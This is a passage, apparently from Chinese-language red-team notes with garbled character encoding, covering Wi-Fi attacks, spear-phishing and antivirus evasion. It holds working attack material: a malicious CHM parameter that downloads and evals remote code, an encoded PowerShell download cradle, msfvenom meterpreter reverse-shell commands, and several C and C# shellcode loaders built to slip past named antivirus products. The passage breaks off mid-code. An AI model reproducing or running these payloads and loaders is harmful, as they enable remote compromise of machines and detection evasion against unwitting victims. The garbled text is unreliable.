<h4 id="WiFièŠ¯ç‰‡esp8266"><a href="#WiFièŠ¯ç‰‡esp8266" class="headerlink" title="WiFièŠ¯ç‰‡esp8266"></a>WiFièŠ¯ç‰‡esp8266</h4><h4 id="Mdk4"><a href="#Mdk4" class="headerlink" title="Mdk4"></a>Mdk4</h4><pre><code>#mdk4 wlan0mon d
</code></pre>
<h4 id="CVE-2018-4407"><a href="#CVE-2018-4407" class="headerlink" title="CVE-2018-4407"></a>CVE-2018-4407</h4><pre><code>Scapy
send(IP(dst=&quot;192.168.1.132&quot;,options=[IPOption(&quot;A&quot;*8)])/TCP(dport=2323,options=[(19, &quot;1&quot;*18),(19, &quot;2&quot;*18)]))
Apple iOS 11åŠæ›´æ—©ç‰ˆæœ¬ï¼šæ‰€æœ‰è®¾å¤‡ï¼ˆå‡çº§åˆ°iOS 12çš„éƒ¨åˆ†è®¾å¤‡ï¼‰
Apple macOS High Sierraï¼ˆå—å½±å“çš„æœ€é«˜ç‰ˆæœ¬ä¸º10.13.6ï¼‰ï¼šæ‰€æœ‰è®¾å¤‡ï¼ˆé€šè¿‡å®‰å…¨æ›´æ–°2018-001ä¿®å¤ï¼‰
Apple macOS Sierraï¼ˆå—å½±å“çš„æœ€é«˜ç‰ˆæœ¬ä¸º10.12.6ï¼‰ï¼šæ‰€æœ‰è®¾å¤‡ï¼ˆé€šè¿‡å®‰å…¨æ›´æ–°2018-005ä¸­ä¿®å¤ï¼‰
Apple OS X El CapitanåŠæ›´æ—©ç‰ˆæœ¬ï¼šæ‰€æœ‰è®¾å¤‡
</code></pre>
<h4 id="ç»•è¿‡macåœ°å€è®¤è¯"><a href="#ç»•è¿‡macåœ°å€è®¤è¯" class="headerlink" title="ç»•è¿‡macåœ°å€è®¤è¯"></a>ç»•è¿‡macåœ°å€è®¤è¯</h4><h5 id="Ifconfig"><a href="#Ifconfig" class="headerlink" title="Ifconfig"></a>Ifconfig</h5><pre><code>#ifconfig wlan1 down
#ifconfig wlan1 hw ether xx:xx:xx:xx:xx:xx
#ifconfig wlan1 up
</code></pre>
<h5 id="Macchanger"><a href="#Macchanger" class="headerlink" title="Macchanger"></a>Macchanger</h5><pre><code>#macchanger â€“m xx:xx:xx:xx:xx:xx wlan1
#macchanger â€“r wlan1
</code></pre>
<h3 id="BadUSB"><a href="#BadUSB" class="headerlink" title="BadUSB"></a>BadUSB</h3><h3 id="å…‹éš†å¡"><a href="#å…‹éš†å¡" class="headerlink" title="å…‹éš†å¡"></a>å…‹éš†å¡</h3><h3 id="è“ç‰™"><a href="#è“ç‰™" class="headerlink" title="è“ç‰™"></a>è“ç‰™</h3><h2 id="é±¼å‰å¼æ”»å‡»"><a href="#é±¼å‰å¼æ”»å‡»" class="headerlink" title="é±¼å‰å¼æ”»å‡»"></a>é±¼å‰å¼æ”»å‡»</h2><h3 id="é’“é±¼é‚®ä»¶"><a href="#é’“é±¼é‚®ä»¶" class="headerlink" title="é’“é±¼é‚®ä»¶"></a>é’“é±¼é‚®ä»¶</h3><pre><code>å‡å†’çš„å†…éƒ¨åŸŸå
å‡å†’çš„å¤–éƒ¨åŸŸå
è¿‘ä¼¼åŸŸå
è¢«é»‘è´¦æˆ·
ç¾¤å‘/ç‰¹å®šå‘
è™šæ„æƒ…æ™¯/æ¶æ„è¿æ¥/æ¶æ„æ–‡ä»¶
</code></pre>
<h4 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h4><h5 id="CVE-2017-11882"><a href="#CVE-2017-11882" class="headerlink" title="CVE-2017-11882"></a>CVE-2017-11882</h5><pre><code>Microsoft Office 2007 SP3 / 2010 SP2 / 2013 SP1 / 2016
</code></pre>
<h5 id="CVE-2017-0199"><a href="#CVE-2017-0199" class="headerlink" title="CVE-2017-0199"></a>CVE-2017-0199</h5><pre><code>Microsoft Office 2007 SP3 / 2010 SP2 / 2013 SP1 / 2016ï¼ŒVista SP2ï¼ŒServer 2008 SP2ï¼ŒWindows 7 SP1ï¼ŒWindows 8.1
</code></pre>
<h5 id="CVE-2012-0158"><a href="#CVE-2012-0158" class="headerlink" title="CVE-2012-0158"></a>CVE-2012-0158</h5><pre><code>Microsoft Office 2003 SP3ã€2007 SP2å’ŒSP3ï¼Œä»¥åŠ2010 Goldå’ŒSP1ï¼›Office 2003 Webç»„ä»¶SP3ï¼›SQL Server 2000 SP4ã€2005 SP4å’Œ2008 SP2ï¼ŒSP3å’ŒR2; BizTalk Server 2002 SP1ï¼›Commerce Server 2002 SP4ã€2007 SP2å’Œ2009 Goldå’ŒR2; Visual FoxPro 8.0 SP1å’Œ9.0 SP2; å’ŒVisual Basic 6.0
</code></pre>
<h5 id="CVE-2017-0143"><a href="#CVE-2017-0143" class="headerlink" title="CVE-2017-0143"></a>CVE-2017-0143</h5><pre><code>Microsoft Windows Vista SP2ï¼›Windows Server 2008 SP2å’ŒR2 SP1; Windows 7 SP1ï¼›Windows 8.1; Windows Server 2012 Goldå’ŒR2ï¼›Windows RT 8.1ï¼›Windows 10 Goldï¼Œ1511å’Œ1607ï¼›ä»¥åŠ å’ŒWindows Server 2016
OFFICEæ–‡æ¡£/ PDFæ–‡ä»¶
</code></pre>
<h4 id="å¯æ‰§è¡Œæ–‡ä»¶"><a href="#å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="å¯æ‰§è¡Œæ–‡ä»¶"></a>å¯æ‰§è¡Œæ–‡ä»¶</h4><h4 id="æ–‡æ¡£æ–‡ä»¶çš„ä¼ªé€ "><a href="#æ–‡æ¡£æ–‡ä»¶çš„ä¼ªé€ " class="headerlink" title="æ–‡æ¡£æ–‡ä»¶çš„ä¼ªé€ "></a>æ–‡æ¡£æ–‡ä»¶çš„ä¼ªé€ </h4><h4 id="æ‰©å±•å-å›¾æ ‡"><a href="#æ‰©å±•å-å›¾æ ‡" class="headerlink" title="æ‰©å±•å/å›¾æ ‡"></a>æ‰©å±•å/å›¾æ ‡</h4><h4 id="æ†ç»‘"><a href="#æ†ç»‘" class="headerlink" title="æ†ç»‘"></a>æ†ç»‘</h4><h4 id="å®"><a href="#å®" class="headerlink" title="å®"></a>å®</h4><h4 id="0day"><a href="#0day" class="headerlink" title="0day"></a>0day</h4><h4 id="CHM"><a href="#CHM" class="headerlink" title="CHM"></a>CHM</h4><pre><code>ä½¿ç”¨ç¼–è¯‘çš„HTMLæ–‡ä»¶åŠ è½½æ¶æ„ä»£ç ã€‚
ä½¿ç”¨EasyCHMå¯¹htmlè¿›è¡Œç¼–è¯‘ï¼Œåœ¨htmlæ–‡ä»¶ä¸­æ’å…¥æ¶æ„ä»£ç ã€‚
ä½¿ç”¨MSFç”Ÿæˆpowershellæ ¼å¼çš„web_deliveryæ¨¡å—
ä½¿ç”¨Rundll32é…åˆMyJSRATå®æ–½è¿è¡Œæ— å¼¹çª—
</code></pre>
<p><img src="./img/44.png" alt="image"></p>
<pre><code>æŠŠå‘½ä»¤baseç¼–ç é¿å…ç‰¹æ®Šç¬¦å·
</code></pre>
<p><img src="./img/45.png" alt="image"></p>
<pre><code>æ‰§è¡Œè¯­å¥ç¼–ç å
&gt;powershell -ep bypass -enc JABCAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAKACQAQgAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAKACQAQgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoASQBFAFgAIAAkAEIALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADAANwA6ADgAMAA4ADAALwBQAEsAUQBOAEUAYgAnACkAOwAKAA==
é€šè¿‡JSRatæ‰§è¡Œpowershellä¸Šçº¿å‘½ä»¤
https://github.com/Ridter/MyJSRat
&gt;python MyJSRat.py -i 192.168.1.107 -p 8888 -c &quot;powershell -ep bypass -enc JABCAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAKACQAQgAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAKACQAQgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoASQBFAFgAIAAkAEIALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADAANwA6ADgAMAA4ADAALwBQAEsAUQBOAEUAYgAnACkAOwAKAA==&quot;
</code></pre>
<p><img src="./img/46.png" alt="image"></p>
<pre><code>è®¿é—®http://ip/wtfå¤åˆ¶åˆ©ç”¨è¯­å¥åˆ°htmlæ–‡ä»¶åç¼–è¯‘
</code></pre>
<p><img src="./img/47.png" alt="image"></p>
<pre><code>&lt;PARAM name=&quot;Item1&quot; value=&#39;,rundll32.exe,javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.0.107:8888/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;&#39;&gt;
</code></pre>
<p><img src="./img/48.png" alt="image"></p>
<pre><code>æ­£å¸¸æ‰“å¼€CHMæ–‡ä»¶ï¼Œæ— å¼¹çª—ä¸Šçº¿ã€‚
</code></pre>
<p><img src="./img/49.png" alt="image"></p>
<h3 id="é’“é±¼é“¾æ¥"><a href="#é’“é±¼é“¾æ¥" class="headerlink" title="é’“é±¼é“¾æ¥"></a>é’“é±¼é“¾æ¥</h3><h4 id="URLè·³è½¬"><a href="#URLè·³è½¬" class="headerlink" title="URLè·³è½¬"></a>URLè·³è½¬</h4><h4 id="ç»“åˆæ¶æ„æ–‡æ¡£æˆ–ç¨‹åº"><a href="#ç»“åˆæ¶æ„æ–‡æ¡£æˆ–ç¨‹åº" class="headerlink" title="ç»“åˆæ¶æ„æ–‡æ¡£æˆ–ç¨‹åº"></a>ç»“åˆæ¶æ„æ–‡æ¡£æˆ–ç¨‹åº</h4><h4 id="çŸ­URL"><a href="#çŸ­URL" class="headerlink" title="çŸ­URL"></a>çŸ­URL</h4><h4 id="ç»“åˆæ°´å‘æ”»å‡»"><a href="#ç»“åˆæ°´å‘æ”»å‡»" class="headerlink" title="ç»“åˆæ°´å‘æ”»å‡»"></a>ç»“åˆæ°´å‘æ”»å‡»</h4><h4 id="ç›¸ä¼¼åŸŸå"><a href="#ç›¸ä¼¼åŸŸå" class="headerlink" title="ç›¸ä¼¼åŸŸå"></a>ç›¸ä¼¼åŸŸå</h4><h4 id="åŸŸåçªƒå–"><a href="#åŸŸåçªƒå–" class="headerlink" title="åŸŸåçªƒå–"></a>åŸŸåçªƒå–</h4><h3 id="ç¬¬ä¸‰æ–¹æœåŠ¡é±¼å‰"><a href="#ç¬¬ä¸‰æ–¹æœåŠ¡é±¼å‰" class="headerlink" title="ç¬¬ä¸‰æ–¹æœåŠ¡é±¼å‰"></a>ç¬¬ä¸‰æ–¹æœåŠ¡é±¼å‰</h3><pre><code>é€šè¿‡ç¤¾äº¤è½¯ä»¶å»ºç«‹å…³ç³»ï¼Œå¦‚ç”·å¥³æœ‹å‹ï¼Œå¸ˆçˆ¶å¾’å¼Ÿï¼ŒHRï¼Œå¯»æ±‚ä¸šåŠ¡ç­‰è¿›è¡Œé’“é±¼æ”»å‡»
</code></pre>
<h1 id="å…æ€"><a href="#å…æ€" class="headerlink" title="å…æ€"></a>å…æ€</h1><h2 id="MSFå…æ€"><a href="#MSFå…æ€" class="headerlink" title="MSFå…æ€"></a>MSFå…æ€</h2><h3 id="nps-payload"><a href="#nps-payload" class="headerlink" title="nps_payload"></a>nps_payload</h3><pre><code>&gt;python nps_payload.pyæ­£å¸¸ç”Ÿæˆ
&gt;msfconsole -r msbuild_nps.rcå¼€å¯ç›‘å¬
&gt;%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe xx.xml
&gt;wmiexec.py &lt;USER&gt;:&#39;&lt;PASS&gt;&#39;@&lt;RHOST&gt; cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\&lt;attackerip&gt;\&lt;share&gt;\msbuild_nps.xml
æ­£å¸¸æ‰§è¡Œç»“æŸè¿›ç¨‹msbuildä¼šå¤±å»ä¼šè¯ï¼Œä»¥ä¸‹ä¿å­˜batæ‰§è¡Œ
è·å¾—sessionåç«‹åˆ»è¿ç§»è¿›ç¨‹
@echo off
echo [*] Please Wait, preparing software ..
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Microsoft.NET\Framework\v4.0.30319\xxx.xml
exit
</code></pre>
<h3 id="ç¼–ç å™¨"><a href="#ç¼–ç å™¨" class="headerlink" title="ç¼–ç å™¨"></a>ç¼–ç å™¨</h3><pre><code>&gt;set EnableStageEncoding true
&gt;set stageencoder x86/fnstenv_mov ç¼–ç è¿›è¡Œå…æ€
&gt;set stageencodingfallback false
&amp;
&gt;msfvenom --list encodersåˆ—å‡ºç¼–ç å™¨
</code></pre>
<h3 id="c-c-æºç å…æ€"><a href="#c-c-æºç å…æ€" class="headerlink" title="c/c++æºç å…æ€"></a>c/c++æºç å…æ€</h3><pre><code>&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f c -o 1.c
-iç¼–ç 20æ¬¡
MSFç›‘å¬éœ€è®¾ç½®è‡ªåŠ¨è¿ç§»è¿›ç¨‹set autorunscript migrate -n explorer.exe
</code></pre>
<h4 id="æŒ‡é’ˆæ‰§è¡Œ"><a href="#æŒ‡é’ˆæ‰§è¡Œ" class="headerlink" title="æŒ‡é’ˆæ‰§è¡Œ"></a>æŒ‡é’ˆæ‰§è¡Œ</h4><pre><code>unsigned char buf[] =
&quot;shellcode&quot;;
#pragma comment(linker,&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) //windowsæ§åˆ¶å°ç¨‹åºä¸å‡ºé»‘çª—å£
main()
&#123;
    ( (void(*)(void))&amp;buf)();
&#125;
ä½¿ç”¨vc6.0ç»„å»ºç¼–è¯‘ååœ¨é¶æœºæ‰§è¡Œ
</code></pre>
<p><img src="./img/50.png" alt="image"></p>
<pre><code>å½“å‰è¿‡ä¸äº†ç«ç»’ï¼Œ360åŠ¨æ€é™æ€å¯è¿‡
</code></pre>
<h4 id="ç”³è¯·åŠ¨æ€å†…å­˜"><a href="#ç”³è¯·åŠ¨æ€å†…å­˜" class="headerlink" title="ç”³è¯·åŠ¨æ€å†…å­˜"></a>ç”³è¯·åŠ¨æ€å†…å­˜</h4><pre><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#pragma comment(linker,&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) //windowsæ§åˆ¶å°ç¨‹åºä¸å‡ºé»‘çª—å£
unsigned char buf[] =
&quot;shellcode&quot;;
main()
&#123;
    char *Memory;
    Memory=VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, buf, sizeof(buf));
    ((void(*)())Memory)();
&#125;
</code></pre>
<h4 id="åµŒå…¥æ±‡ç¼–"><a href="#åµŒå…¥æ±‡ç¼–" class="headerlink" title="åµŒå…¥æ±‡ç¼–"></a>åµŒå…¥æ±‡ç¼–</h4><pre><code>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#pragma comment(linker, &quot;/section:.data,RWE&quot;)
unsigned char shellcode[] =&quot;&quot;;
void main()
&#123;
    __asm
    &#123;
        mov eax, offset shellcode
        jmp eax
    &#125;
&#125;
</code></pre>
<h4 id="å¼ºåˆ¶ç±»å‹è½¬æ¢"><a href="#å¼ºåˆ¶ç±»å‹è½¬æ¢" class="headerlink" title="å¼ºåˆ¶ç±»å‹è½¬æ¢"></a>å¼ºåˆ¶ç±»å‹è½¬æ¢</h4><pre><code>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
unsigned char buf[] =&quot;&quot;;
void main()
&#123;
 ((void(WINAPI*)(void))&amp;buf)();
&#125;
</code></pre>
<h4 id="æ±‡ç¼–èŠ±æŒ‡ä»¤"><a href="#æ±‡ç¼–èŠ±æŒ‡ä»¤" class="headerlink" title="æ±‡ç¼–èŠ±æŒ‡ä»¤"></a>æ±‡ç¼–èŠ±æŒ‡ä»¤</h4><pre><code>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#pragma comment(linker, &quot;/section:.data,RWE&quot;)
unsigned char shellcode[] =&quot;&quot;;
void main()
&#123;
        __asm
    &#123;
        mov eax, offset shellcode
        _emit 0xFF  
        _emit 0xE0
    &#125;
&#125;
</code></pre>
<h4 id="XORåŠ å¯†"><a href="#XORåŠ å¯†" class="headerlink" title="XORåŠ å¯†"></a>XORåŠ å¯†</h4><pre><code>https://github.com/Arno0x/ShellcodeWrapperå®‰è£…
ç”Ÿæˆrawæ ¼å¼æœ¨é©¬
&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f raw -o shell.raw
</code></pre>
<p><img src="./img/51.png" alt="image"></p>
<pre><code>åŠ å¯†
&gt; python shellcode_encoder.py -cpp -cs -py shell.raw thisiskey xor
ç”Ÿæˆçš„pyæ–‡ä»¶ä½¿ç”¨py2exeç¼–è¯‘æ‰§è¡Œ
ç”Ÿæˆçš„csæ–‡ä»¶ä½¿ç”¨csc.exeç¼–è¯‘æ‰§è¡Œ
ç”Ÿæˆçš„cppæ–‡ä»¶ä½¿ç”¨vc6.0ç¼–è¯‘ï¼Œå»æ‰é¢„ç¼–è¯‘å¤´ç¼–è¯‘æ‰§è¡Œ
</code></pre>
<p><img src="./img/52.png" alt="image"></p>
<h4 id="è¿œç¨‹çº¿ç¨‹æ³¨å…¥"><a href="#è¿œç¨‹çº¿ç¨‹æ³¨å…¥" class="headerlink" title="è¿œç¨‹çº¿ç¨‹æ³¨å…¥"></a>è¿œç¨‹çº¿ç¨‹æ³¨å…¥</h4><pre><code>ç›®å‰è¿‡ç«ç»’ï¼Œä¸è¿‡360ï¼Œå¯ç»„åˆä¸€ä¸‹
Vsæ–°å»ºc++æ§åˆ¶å°ç¨‹åº
å³é”®å±æ€§-ã€‹å°†MFCçš„ä½¿ç”¨é€‰ä¸ºåœ¨é™æ€åº“ä¸­ä½¿ç”¨MFC
ç”Ÿæˆcæ ¼å¼shellcodeç²˜è´´è¿›remote inject.cpp
</code></pre>
<p><img src="./img/53.png" alt="image"></p>
<pre><code>ç”Ÿæˆé¡¹ç›®
èƒ½æˆåŠŸä¸Šçº¿ï¼Œå¹¶å¼€å¯calcè¿›ç¨‹
</code></pre>
<p><img src="./img/54.png" alt="image"><br><img src="./img/55.png" alt="image"></p>
<h4 id="åŠ è½½å™¨å…æ€"><a href="#åŠ è½½å™¨å…æ€" class="headerlink" title="åŠ è½½å™¨å…æ€"></a>åŠ è½½å™¨å…æ€</h4><h5 id="shellcode-launcher"><a href="#shellcode-launcher" class="headerlink" title="shellcode_launcher"></a>shellcode_launcher</h5><pre><code>https://github.com/clinicallyinane/shellcode_launcher/
ç”Ÿæˆpayload(raw)
&gt;msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#39;\x00&#39; lhost=192.168.0.108 lport=12138 -f raw -o shellcode.raw
åŠ è½½å™¨åŠ è½½
&gt;shellcode_launcher.exe -i shellcode.raw
</code></pre>
<h5 id="SSIåŠ è½½"><a href="#SSIåŠ è½½" class="headerlink" title="SSIåŠ è½½"></a>SSIåŠ è½½</h5><pre><code>https://github.com/DimopoulosElias/SimpleShellcodeInjector
ç”Ÿæˆpayload(c)
&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f c -o shellcode.c
æ‰§è¡Œ
&gt;cat shellcode.c |grep -v unsigned|sed &quot;s/\&quot;\\\x//g&quot;|sed &quot;s/\\\x//g&quot;|sed &quot;s/\&quot;//g&quot;|sed &#39;:a;N;$!ba;s/\n//g&#39;|sed &quot;s/;//g&quot;
</code></pre>
<p><img src="./img/56.png" alt="image"></p>
<pre><code>MSFç›‘å¬
å¯ä½¿ç”¨minGWè‡ªè¡Œç¼–è¯‘
&gt;gcc SimpleShellcodeInjector.c -o xxx.exe
æ‰§è¡Œ
&gt;xxx.exe +ç”Ÿæˆçš„ç¼–ç 
</code></pre>
<h3 id="c-æºç å…æ€"><a href="#c-æºç å…æ€" class="headerlink" title="c#æºç å…æ€"></a>c#æºç å…æ€</h3><h4 id="ç›´æ¥ç¼–è¯‘"><a href="#ç›´æ¥ç¼–è¯‘" class="headerlink" title="ç›´æ¥ç¼–è¯‘"></a>ç›´æ¥ç¼–è¯‘</h4><pre><code>ç”Ÿæˆpayload
MSFç›‘å¬éœ€è®¾ç½®è‡ªåŠ¨è¿ç§»è¿›ç¨‹set autorunscript migrate -n explorer.exe
&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt
MSFå¯åŠ¨ç›‘å¬
Payloadç²˜è´´åˆ°ä½ç½®
using System;
using System.Runtime.InteropServices;
namespace TCPMeterpreterProcess
&#123;
    class Program
    &#123;
        static void Main(string[] args)
        &#123;
            byte[] shellcode = new byte[] &#123;payload here&#125;;
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        &#125;
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport(&quot;kernel32&quot;)]
        private static extern bool VirtualFree(IntPtr lpAddress,
        UInt32 dwSize, UInt32 dwFreeType);
        [DllImport(&quot;kernel32&quot;)]
        private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern bool CloseHandle(IntPtr handle);
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern IntPtr GetModuleHandle(
            string moduleName
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 GetProcAddress(
            IntPtr hModule,
            string procName
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 LoadLibrary(
            string lpFileName
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 GetLastError();
    &#125;
&#125;
Visual studioåˆ›å»ºC#.net frameworkæ§åˆ¶å°ç¨‹åºç¼–è¯‘å¯è¿‡æ€è½¯
</code></pre>
<h4 id="åŠ å¯†å¤„ç†"><a href="#åŠ å¯†å¤„ç†" class="headerlink" title="åŠ å¯†å¤„ç†"></a>åŠ å¯†å¤„ç†</h4><pre><code>ç”Ÿæˆpayload
MSFç›‘å¬éœ€è®¾ç½®è‡ªåŠ¨è¿ç§»è¿›ç¨‹set autorunscript migrate -n explorer.exe
&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt
ç²˜è´´payloadåç¼–è¯‘åŠ å¯†
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
namespace Payload_Encrypt_Maker
&#123;
    class Program
    &#123;
        // åŠ å¯†å¯†é’¥ï¼Œå¯ä»¥æ›´æ”¹ï¼ŒåŠ è§£å¯†æºç ä¸­ä¿æŒKEYä¸€è‡´å°±è¡Œ
        static byte[] KEY = &#123; 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 &#125;;
        static byte[] IV = &#123; 0x00, 0xcc, 0x00, 0x00, 0x00, 0xcc &#125;;
        static byte[] payload = &#123; payload here &#125;;    // æ›¿æ¢æˆMSFç”Ÿæˆçš„shellcode
        private static class Encryption_Class
        &#123;
            public static string Encrypt(string key, string data)
            &#123;
                Encoding unicode = Encoding.Unicode;
                return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
            &#125;
            public static byte[] Encrypt(byte[] key, byte[] data)
            &#123;
                return EncryptOutput(key, data).ToArray();
            &#125;
            private static byte[] EncryptInitalize(byte[] key)
            &#123;
                byte[] s = Enumerable.Range(0, 256)
                .Select(i =&gt; (byte)i)
                .ToArray();
                for (int i = 0, j = 0; i &lt; 256; i++)
                &#123;
                    j = (j + key[i % key.Length] + s[i]) &amp; 255;
                    Swap(s, i, j);
                &#125;
                return s;
            &#125;
            private static IEnumerable&lt;byte&gt; EncryptOutput(byte[] key, IEnumerable&lt;byte&gt; data)
            &#123;
                byte[] s = EncryptInitalize(key);
                int i = 0;
                int j = 0;
                return data.Select((b) =&gt;
                &#123;
                    i = (i + 1) &amp; 255;
                    j = (j + s[i]) &amp; 255;
                    Swap(s, i, j);
                    return (byte)(b ^ s[(s[i] + s[j]) &amp; 255]);
                &#125;);
            &#125;
            private static void Swap(byte[] s, int i, int j)
            &#123;
                byte c = s[i];
                s[i] = s[j];
                s[j] = c;
            &#125;
        &#125;
        static void Main(string[] args)
        &#123;
            byte[] result = Encryption_Class.Encrypt(KEY, payload);
            int b = 0;
            for (int i = 0; i &lt; result.Length; i++)
            &#123;
                b++;
                if (i == result.Length + 1)
                &#123; Console.Write(result[i].ToString()); &#125;
                if (i != result.Length) &#123; Console.Write(result[i].ToString() + &quot;,&quot;); &#125;
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<p><img src="./img/57.png" alt="image"></p>
<pre><code>ç¼–è¯‘è§£å¯†
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace NativePayload_Reverse_tcp
&#123;
    public class Program
&#123;
        public static void Main()
        &#123;
            Shellcode.Exec();
  &#125;
&#125;
class Shellcode
&#123;
  public static void Exec()
  &#123;
    string Payload_Encrypted;
    Payload_Encrypted = &quot;payload here&quot;;
    string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(&#39;,&#39;);
    byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
    for (int i = 0; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)
    &#123;
      byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
      _X_to_Bytes[i] = current;
    &#125;
    // è§£å¯†å¯†é’¥ï¼Œå¯ä»¥æ›´æ”¹ï¼ŒåŠ è§£å¯†æºç ä¸­ä¿æŒKEYä¸€è‡´å°±è¡Œ
            byte[] KEY = &#123; 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 &#125;;
            byte[] MsfPayload = Decrypt(KEY, _X_to_Bytes);
            // åŠ è½½shellcode
            IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);
            Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);
            CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);
            Thread.Sleep(2000);
        &#125;
        public static byte[] Decrypt(byte[] key, byte[] data)
        &#123;
            return EncryptOutput(key, data).ToArray();
        &#125;
